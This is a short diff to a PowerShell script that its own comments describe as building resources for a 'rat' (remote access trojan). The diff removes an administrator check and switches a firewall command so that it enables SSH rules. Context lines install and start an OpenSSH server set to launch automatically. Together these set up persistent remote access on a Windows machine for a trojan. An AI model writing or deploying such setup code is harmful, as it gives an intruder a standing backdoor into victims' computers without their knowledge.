@@ -1,13 +1,6 @@
 #biulds resources for the  rat
 # created by Dark Lord
 
-if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "ERROR: Run PowerShell as Administrator!" -ForegroundColor Red
-    pause
-    exit
-}
-
-
 
 
 #random string for direcories
@@ -84,8 +77,7 @@ $initial_dir = Get-Location
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 
 Start-Service sshd 
 Set-Service  -Name sshd -StartupType 'Automatic' 
-Get-NetFirewallRule -Name *ssh* -Enabled True
-
+Get-NetFirewallRule -Name *ssh* | Set-NetFirewallRule -Enabled True
 
 
 
